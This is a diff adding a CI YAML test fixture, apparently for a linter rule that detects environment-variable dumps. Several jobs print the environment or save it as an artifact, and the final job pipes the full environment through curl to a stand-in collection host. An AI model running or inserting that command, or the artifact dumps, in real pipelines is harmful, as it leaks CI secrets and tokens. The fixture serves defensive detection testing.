@@ -1,0 +1,35 @@
+# #1161: preserve legacy quoted/comment dumps, reject new case labels,
+# and recognise the shared GL083 environment source.
+quoted-bash:
+  script: |
+    bash -c "cd /tmp; env; make"
+
+quoted-sh:
+  script: |
+    sh -c 'cd /tmp; env; make'
+
+quoted-artifact:
+  script: |
+    bash -c "cd /tmp && env > v"
+  artifacts:
+    paths: [v]
+    expire_in: 1 week
+
+comment-artifact:
+  script: |
+    # don't
+    env > v
+  artifacts:
+    paths: [v]
+    expire_in: 1 week
+
+case-labels:
+  script: |
+    case "$action" in
+    set) do_set ;;
+    export) do_export ;;
+    esac
+
+environment-send:
+  script:
+    - set | curl -d @- https://collect.example.net/e
